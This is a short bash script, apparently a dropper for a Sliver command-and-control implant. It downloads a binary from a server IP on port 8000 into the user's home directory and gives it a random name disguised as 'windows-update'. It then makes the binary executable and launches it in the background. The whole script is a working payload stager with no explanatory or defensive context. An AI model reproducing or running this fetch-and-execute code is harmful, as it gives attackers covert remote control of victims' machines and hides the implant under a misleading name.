#!/bin/bash
name="windows-update-$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 10)"
cd && writable=$(pwd)
wget http://${server_ip}:8000/sliver -O "$writable/$name"
chmod +x "$writable/$name"
"$writable/$name" &